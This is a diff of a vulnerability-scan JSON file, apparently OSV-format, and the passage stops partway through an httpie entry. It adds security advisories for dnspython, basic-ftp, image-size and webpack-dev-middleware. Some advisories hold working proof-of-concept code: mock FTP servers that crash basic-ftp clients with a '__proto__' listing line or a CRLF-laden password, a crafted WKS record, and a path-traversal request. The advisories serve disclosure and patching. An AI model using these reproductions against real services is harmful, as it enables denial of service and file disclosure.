@@ -4065,6 +4065,16 @@
                 "GHSA-45c3-73f7-pv4m"
               ],
               "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-vvf4-9x63-8xvv"
+              ],
+              "aliases": [
+                "CVE-2026-128089",
+                "GHSA-vvf4-9x63-8xvv"
+              ],
+              "max_severity": "7.5"
             }
           ],
           "vulnerabilities": [
@@ -4160,7 +4170,7 @@
               },
               "details": "### Impact\nA maliciously crafted DNS message may cause dns.name.from_wire_parser() to use excessive CPU for DNS name decompression.  Applications that process untrusted DNS wire form messages with dnspython may be degraded or DoS'd by the extra CPU use required.\n\n### Patches\nThis problem is fixed in dnspython 2.9.0.\n\n### Workarounds\nThere are no known workarounds.\n\n### Credit\nEvgenios Gkritsis, Department of Informatics, University of Piraeus \u0026 Athena Research Center, Greece\nConstantinos Patsakis, Department of Informatics, University of Piraeus \u0026 Athena Research Center, Greece\nGeorge Stergiopoulos, Department of Informatics, Athens University of Economics and Business, Greece",
               "id": "GHSA-45c3-73f7-pv4m",
-              "modified": "2026-10-27T15:47:24.143338210Z",
+              "modified": "2026-11-12T06:45:04.187278145Z",
               "published": "2026-10-27T15:37:37Z",
               "references": [
                 {
@@ -4182,6 +4192,10 @@
                 {
                   "type": "WEB",
                   "url": "https://github.com/rthalley/dnspython/releases/tag/v2.9.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2026/11/msg00017.html"
                 }
               ],
               "schema_version": "1.9.2",
@@ -4192,6 +4206,134 @@
                 }
               ],
               "summary": "dnspython dns.name.from_wire_parser() excessive CPU use"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-vvf4-9x63-8xvv/GHSA-vvf4-9x63-8xvv.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "dnspython",
+                    "purl": "pkg:pypi/dnspython"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.9.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.12.0",
+                    "1.13.0",
+                    "1.14.0",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.2.0",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.3.2",
+                    "1.3.3",
+                    "1.3.4",
+                    "1.3.5",
+                    "1.4.0",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.9.0",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4",
+                    "2.0.0",
+                    "2.0.0rc1",
+                    "2.0.0rc2",
+                    "2.1.0",
+                    "2.1.0rc1",
+                    "2.2.0",
+                    "2.2.0rc1",
+                    "2.2.1",
+                    "2.3.0",
+                    "2.3.0rc1",
+                    "2.4.0",
+                    "2.4.0rc1",
+                    "2.4.1",
+                    "2.4.2",
+                    "2.5.0",
+                    "2.5.0rc1",
+                    "2.6.0",
+                    "2.6.0rc1",
+                    "2.6.1",
+                    "2.7.0",
+                    "2.7.0rc1",
+                    "2.8.0",
+                    "2.8.0rc1",
+                    "2.9.0",
+                    "2.9.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-128089"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400",
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T20:19:13Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nA maliciously crafted zone file could use a WKS record to consume excessive memory and CPU, possibly causing the process to exit due to memory exhaustion.\n\n### Details\n\nThe `from_text()` parser does not check that a WKS record service number is between 0 and 65535 inclusive.  It then uses this number to resize the bitmap to accommodate a bit with that offset.  This can cause extremely large memory allocations, and also extends the array very inefficiently, wasting CPU.\n\n### Proof of concept\n\nThis demonstrates the failure to limit the service number, though with a value that does not cause excessive memory or CPU consumption.\n\n```\nrd = dns.rdata.from_text(\"IN\", \"WKS\", \"10.0.0.1 udp 65536\")\n```\n\n### Impact\n\nIf dnspython is used to read zonefile format where the attacker can control the type and rdata text, the program may consume excessive memory or CPU, denying service.",
+              "id": "GHSA-vvf4-9x63-8xvv",
+              "modified": "2026-11-13T20:30:03.656200167Z",
+              "published": "2026-11-13T20:19:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rthalley/dnspython/security/advisories/GHSA-vvf4-9x63-8xvv"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rthalley/dnspython/commit/388db14ee9923288f6e73f86e482c77706e59d73"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rthalley/dnspython/commit/a62e1be066da0ed71b5b59f37435bb17cfa0070f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/rthalley/dnspython"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/rthalley/dnspython/releases/tag/v2.9.2"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "dnspython has excessive memory and CPU use"
             }
           ]
         },
@@ -44570,6 +44712,16 @@
           "groups": [
             {
               "ids": [
+                "GHSA-5pm8-86m8-9m6r"
+              ],
+              "aliases": [
+                "CVE-2026-126345",
+                "GHSA-5pm8-86m8-9m6r"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
                 "GHSA-c475-qrg2-pj4r"
               ],
               "aliases": [
@@ -44577,9 +44729,90 @@
                 "GHSA-c475-qrg2-pj4r"
               ],
               "max_severity": "8.2"
+            },
+            {
+              "ids": [
+                "GHSA-r4jh-29pc-gfqr"
+              ],
+              "aliases": [
+                "CVE-2026-126346",
+                "GHSA-r4jh-29pc-gfqr"
+              ],
+              "max_severity": "5.9"
             }
           ],
           "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.2.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-5pm8-86m8-9m6r/GHSA-5pm8-86m8-9m6r.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "basic-ftp",
+                    "purl": "pkg:npm/basic-ftp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.2.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126345"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321",
+                  "CWE-248"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T21:42:12Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nbasic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name \"__proto__\" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the \"not a function\" guard is bypassed and the code throws `TypeError: factHandler is not a function`.\n\nThis TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).\n\n### Details\n\nFile: src/parseListMLSD.ts\n```\nconst factHandlersByName: {[key: string]: FactHandler} = {\n    \"size\": parseSize,\n    \"sizd\": parseSize,\n    \"unique\": (value, info) =\u003e { info.uniqueID = value },\n    \"modify\": (value, info) =\u003e { ... },\n    \"type\": (value, info) =\u003e { ... },\n    \"unix.mode\": (value, info) =\u003e { ... },\n    ...\n}\n\nexport function parseLine(line: string): FileInfo | undefined {\n    const [ packedFacts, name ] = splitStringOnce(line, \" \")\n    ...\n    const facts = packedFacts.split(\";\")\n    for (const fact of facts) {\n        const [ factName, factValue ] = splitStringOnce(fact, \"=\")\n        if (!factValue) { continue }\n        const factHandler = factHandlersByName[factName.toLowerCase()]   // \u003c-- unsafe lookup\n        if (!factHandler) { continue }\n        const result = factHandler(factValue, info)                     // \u003c-- throws here\n        ...\n    }\n    return info\n}\n```\nfactHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === \"__proto__\", the bracket lookup factHandlersByName[\"__proto__\"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.\n\nThis line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -\u003e Client.list() (src/Client.ts). list()'s only error handling is:\n```\n    catch (err) {\n        const shouldTryNext = err instanceof FTPError\n        if (!shouldTryNext) { throw err }\n        lastError = err\n    }\n```\nA plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.\n\nAffected call paths (all eventually call Client.list()):\n- Client.list()\n- Client.downloadToDir() / _downloadFromWorkingDir()\n- Client.clearWorkingDir()\n- Client.removeDir()\n\nOnly \"__proto__\" triggers the crash this way; other reserved Object.prototype property names tested (\"constructor\", \"toString\", \"hasOwnProperty\", \"valueOf\", \"__defineGetter__\") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.\n\n### Proof of concept\n\nPrerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.\n\nStep 1 — Minimal reproduction of the parser bug alone:\n\n    node -e '\n    const { parseList } = require(\"./dist/parseList\");\n    parseList(\"__proto__=x;type=file;size=10; evil.txt\");\n    '\n\nExpected result:\n    Uncaught TypeError: factHandler is not a function\n        at parseLine (.../dist/parseListMLSD.js:...)\n\nStep 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:\n\n    Save as poc.js in the repo root and run `node poc.js`:\n\n    const net = require(\"net\")\n    const { Client } = require(\"./dist/index\")\n\n    const server = net.createServer(socket =\u003e {\n        socket.write(\"220 fake ftp ready\\r\\n\")\n        socket.on(\"data\", data =\u003e {\n            const cmd = data.toString().trim()\n            if (cmd.startsWith(\"USER\")) socket.write(\"230 ok\\r\\n\")\n            else if (cmd.startsWith(\"OPTS\") || cmd.startsWith(\"TYPE\") ||\n                     cmd.startsWith(\"STRU\") || cmd.startsWith(\"PBSZ\") ||\n                     cmd.startsWith(\"PROT\")) socket.write(\"200 ok\\r\\n\")\n            else if (cmd.startsWith(\"FEAT\")) socket.write(\"211-Features\\r\\n MLST type;size;\\r\\n211 End\\r\\n\")\n            else if (cmd.startsWith(\"EPSV\")) {\n                const dataServer = net.createServer(dsock =\u003e {\n                    // The malicious line: fact name \"__proto__\"\n                    dsock.end(\"__proto__=pwn;type=file;size=4; evil.txt\\r\\n\")\n                })\n                dataServer.listen(0, \"127.0.0.1\", () =\u003e {\n                    const p = dataServer.address().port\n                    socket.write(`229 Entering Extended Passive Mode (|||${p}|)\\r\\n`)\n                })\n            }\n            else if (cmd.startsWith(\"MLSD\") || cmd.startsWith(\"LIST\")) {\n                socket.write(\"150 Here comes the listing\\r\\n\")\n                setTimeout(() =\u003e socket.write(\"226 Listing complete\\r\\n\"), 50)\n            }\n            else socket.write(\"200 ok\\r\\n\")\n        })\n    })\n\n    server.listen(2121, \"127.0.0.1\", async () =\u003e {\n        const client = new Client()\n        try {\n            await client.access({ host: \"127.0.0.1\", port: 2121, user: \"a\", password: \"b\" })\n            const files = await client.list()\n            console.log(\"list() returned normally (unexpected):\", files)\n        } catch (err) {\n            console.log(\"client.list() threw:\", err.constructor.name, \"-\", err.message)\n        } finally {\n            client.close()\n            server.close()\n            process.exit(0)\n        }\n    })\n\nExpected output:\n\n    client.list() threw: TypeError - factHandler is not a function\n\nConfiguration notes:\n- No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV\n  text) session using the server's FEAT response to turn on MLSD, which is the common\n  path for any modern FTP server.\n- The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since\n  parseList() auto-detects the format from the last listing line.\n- In a real application without a try/catch around list()/downloadToDir()/\n  clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the\n  Node.js process by default (Node \u003e=15 unhandledRejection behavior is \"throw\").\n\n### Impact\n\nType: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).\n\nWho is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.\n\nConfidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.",
+              "id": "GHSA-5pm8-86m8-9m6r",
+              "modified": "2026-11-12T21:45:03.430629333Z",
+              "published": "2026-11-12T21:42:12Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/patrickjuchli/basic-ftp"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "basic-ftp: Uncaught TypeError in MLSD directory-listing parser via __proto__ fact name causes DoS in Client.list()"
+            },
             {
               "affected": [
                 {
@@ -44653,6 +44886,77 @@
                 }
               ],
               "summary": "basic-ftp: Quadratic-time CPU denial of service in Client.list() Unix directory-listing parser (RE_LINE backtracking)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.2.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-r4jh-29pc-gfqr/GHSA-r4jh-29pc-gfqr.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "basic-ftp",
+                    "purl": "pkg:npm/basic-ftp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.2.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126346"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248",
+                  "CWE-755"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T22:23:50Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nClient.login() calls FTPContext.send() from inside the control-socket data event handler. send() throws on CR, LF or NUL, and nothing catches the throw. A password containing \\r\\n therefore raises an uncaught exception and terminates the whole Node.js process. It does not reject the returned promise. Any application that passes untrusted input as the FTP password can be crashed remotely with one request. The same pattern exists in the REST/RETR path of downloadTo() when the remote path contains control characters.\n\n### Details\n\nThe CRLF guard (FTPContext.send, src/FtpContext.ts ~L233) correctly refuses to send commands containing \\r, \\n or \\0:\n```ts\nsend(command: string) {\n    if (/[\\r\\n\\0]/.test(command)) {\n        throw new Error(`Invalid command: Contains control characters. (${command})`);\n    }\n```\n\nThat works when send() is called from handle(), because it runs inside a Promise executor and the throw becomes a rejection. But in two places send() runs inside a response handler, which is called synchronously from the socket’s data event:\n\nClient.login() (src/Client.ts ~L246-248): after the server answers 331 to USER, the handler calls this.ftp.send(\"PASS \" + password). The USER command was already sent and is valid, so the password is only checked at this point. The call chain is socket.on(\"data\") → _onControlSocketData → _passToHandler → responseHandler → send() → throw. No try/catch exists anywhere in that chain, so it becomes an uncaughtException.\ndownloadTo() (src/transfer.ts ~L368-370): when startAt \u003e 0, the initial command is REST n, which contains no user-controlled text. When the server answers 350, the handler calls config.ftp.send(\"RETR \" + config.remotePath). This remotePath was never checked before. A path with a control character throws in the data handler in the same way. (Found by code reading, not reproduced.)\n\nBecause the exception happens during data event dispatch, it can’t be handled with try/catch or .catch() around client.access() or downloadTo(). The application only survives if it has a global process.on(\"uncaughtException\") handler.\n\n### Proof of concept\n\nTested on Node.js v22.22.0 against basic-ftp 6.2.2 (built from source). It uses a minimal mock FTP server on localhost:\n\n```js\nconst net = require(\"net\")\nconst ftp = require(\"basic-ftp\")\n\nconst srv = net.createServer(s =\u003e {\n  s.write(\"220 hi\\r\\n\")\n  s.on(\"data\", d =\u003e {\n    const c = d.toString()\n    if (c.startsWith(\"USER\")) s.write(\"331 pw\\r\\n\")\n    else if (c.startsWith(\"PASS\")) s.write(\"230 ok\\r\\n\")\n    else s.write(\"200 ok\\r\\n\")\n  })\n})\n\nsrv.listen(0, async () =\u003e {\n  const c = new ftp.Client(2000)\n  try {\n    await c.access({\n      host: \"127.0.0.1\",\n      port: srv.address().port,\n      user: \"bob\",\n      password: \"x\\r\\nDELE important\"   // attacker-controlled value\n    })\n  } catch (e) {\n    console.log(\"rejected:\", e.message)  // never reached\n  }\n  console.log(\"handled gracefully\")      // never reached\n  process.exit(0)\n})\n```\nResult: the process terminates with an uncaught exception and neither catch nor the final console.log runs:\n```\nError: Invalid command: Contains control characters. (PASS x\nDELE important)\n    at FTPContext.send (dist/FtpContext.js:189:19)\n    at Object.responseHandler (dist/Client.js:186:26)\n    at FTPContext._passToHandler (dist/FtpContext.js:322:24)\n    at FTPContext._onControlSocketData (dist/FtpContext.js:312:18)\n    at Socket.\u003canonymous\u003e (dist/FtpContext.js:133:44)\n```\nThe server in the PoC is benign. Any normal FTP server that replies 331 to USER triggers the same crash.\n\n### Impact\n\nDenial of service (uncaught exception, process termination), CWE-248.\n\nIt affects applications that pass untrusted or user-influenced values as the FTP password, or as the remote path of a resumed download. Examples are web apps or services that let users enter their own FTP credentials, or file-transfer or backup tools driven by user-supplied paths. One request crashes the whole Node.js process and every other client it serves. It needs no authentication to the FTP server and no special server behaviour. The attacker only needs control over the string. Confidentiality and integrity are not affected, and the CRLF guard still blocks command injection.\n\nSuggested fix:\n\nIn FTPContext._passToHandler(), wrap the handler call in a try/catch that rejects the task and calls closeWithError(err).\nValidate password in login(), and remotePath in _downloadToStream(), before any I/O and reject early.",
+              "id": "GHSA-r4jh-29pc-gfqr",
+              "modified": "2026-11-12T22:30:03.983522899Z",
+              "published": "2026-11-12T22:23:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-r4jh-29pc-gfqr"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/commit/0495b906bdf891e68806721b07b333dba65ec88e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/patrickjuchli/basic-ftp"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.3"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "basic-ftp: Uncaught exception crashes the Node.js process when a password (or resumed-download path) contains CR/LF"
             }
           ]
         },
@@ -54697,7 +55001,195 @@
             "name": "image-size",
             "version": "2.0.2",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5p2g-fcmc-qvqq"
+              ],
+              "aliases": [
+                "CVE-2025-71329",
+                "GHSA-5p2g-fcmc-qvqq"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-w3rx-r6r6-pgpr"
+              ],
+              "aliases": [
+                "CVE-2025-71330",
+                "GHSA-w3rx-r6r6-pgpr"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.0.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-5p2g-fcmc-qvqq/GHSA-5p2g-fcmc-qvqq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "image-size",
+                    "purl": "pkg:npm/image-size"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.2.0"
+                        },
+                        {
+                          "fixed": "2.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-71329"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-08-07T20:54:40Z",
+                "nvd_published_at": "2026-06-10T14:16:30Z",
+                "severity": "HIGH"
+              },
+              "details": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.",
+              "id": "GHSA-5p2g-fcmc-qvqq",
+              "modified": "2026-09-24T18:45:10.915244487Z",
+              "published": "2026-06-10T15:31:30Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71329"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/image-size/image-size"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "image-size: JXL and HEIF parsers allow denial of service through infinite loops"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.0.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w3rx-r6r6-pgpr/GHSA-w3rx-r6r6-pgpr.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "image-size",
+                    "purl": "pkg:npm/image-size"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.6.3"
+                        },
+                        {
+                          "fixed": "2.0.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-71330"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-08-07T20:55:24Z",
+                "nvd_published_at": "2026-06-10T14:16:30Z",
+                "severity": "HIGH"
+              },
+              "details": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+              "id": "GHSA-w3rx-r6r6-pgpr",
+              "modified": "2026-09-24T18:30:11.322772203Z",
+              "published": "2026-06-10T15:31:30Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71330"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/image-size/image-size"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "image-size: ICNS parser allows denial of service through an infinite loop"
+            }
+          ]
         },
         {
           "package": {
@@ -80460,7 +80952,7 @@
               },
               "details": "\u003e [!IMPORTANT]\n\u003e CVE-2026-76844 was assigned and published for this issue by VulnCheck on 2026-08-24 without prior coordination with the webpack maintainers or the OpenJS Foundation, which holds the CVE Numbering Authority scope for webpack projects. Neither the maintainers nor the OpenJS CNA were notified before publication, and no fix was available at that time. This advisory is the coordinated record produced by the webpack maintainers and the OpenJS Foundation CNA.\n\n### Impact\n\n`webpack-dev-middleware` resolves a request to a local file in `getFilenameFromUrl`. When the configured `publicPath` has no trailing slash (for example `/assets`), a request that shares that prefix without being under it (for example `/assets../secret`) still passes the containment check, and the `..` guard does not catch it because it runs on the path before the `publicPath` prefix is stripped. The stripped remainder then escapes the configured output directory once joined, so an unauthenticated request can read files outside the output root. Applications serving `webpack-dev-middleware` (directly or via `webpack-dev-server`) with a `publicPath` that does not end in a slash are affected. A development server reachable on the network can be attacked with a single request and no victim interaction.\n\n### Patches\n\nPatched in `webpack-dev-middleware` 8.3.0. There is no backport to the 5.x, 6.x, or 7.x lines; users on those lines should upgrade to 8.3.0 or later.\n\n### Workarounds\n\nConfigure `publicPath` with a trailing slash (for example `/assets/` instead of `/assets`), or upgrade to a patched version.\n\n### References\n\n- [CVE-2024-29180](https://www.cve.org/CVERecord?id=CVE-2024-29180) ([GHSA-wr3j-pwj9-hqq6](https://github.com/webpack/webpack-dev-middleware/security/advisories/GHSA-wr3j-pwj9-hqq6)), the earlier path traversal in the same component that this issue bypasses.",
               "id": "GHSA-g84c-rxfj-3j2c",
-              "modified": "2026-10-03T03:56:01.635170780Z",
+              "modified": "2026-11-14T02:57:07.669911324Z",
               "published": "2026-09-29T16:59:18Z",
               "references": [
                 {
@@ -80507,6 +80999,9 @@
                   "type": "WEB",
                   "url": "https://www.vulncheck.com/advisories/webpack-dev-middleware-path-traversal-via-offset-slice-on-a-non-slash-terminated-publicpath"
                 }
+              ],
+              "related": [
+                "CVE-2026-76844"
               ],
               "schema_version": "1.9.0",
               "severity": [
@@ -90053,7 +90548,128 @@
             "name": "httpie",
             "version": "3.2.4",
             "ecosystem": "PyPI"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "PYSEC-2023-242"
+              ],
+              "aliases": [
+                "CVE-2023-48052",
+                "GHSA-8r96-8889-qg2x",
+                "PYSEC-2023-242"
+              ],
+              "max_severity": "7.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/httpie/PYSEC-2023-242.yaml"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "httpie",
+                    "purl": "pkg:pypi/httpie"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.1",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.2.0",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.2.4",
+                    "0.2.4dev",
